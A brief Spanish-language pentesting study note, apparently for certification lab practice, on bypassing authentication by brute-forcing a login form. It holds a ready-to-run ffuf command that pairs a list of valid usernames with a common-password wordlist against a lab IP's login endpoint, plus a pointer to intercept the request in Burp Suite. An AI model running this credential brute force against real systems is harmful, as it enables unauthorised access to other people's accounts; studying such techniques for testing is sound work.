## Authentication bypass
Teniendo una lista de usuarios válidos [Explicación](https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/reco/recousersweb.md), podemos intentar fuerza bruta a las contraseñas.  
```ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.144.67/customers/login -fc 200 ```
De la misma manera, se debe interceptar la peticion por burpsuite y analizar que campos debemos modificar para que funcione el ataque.  

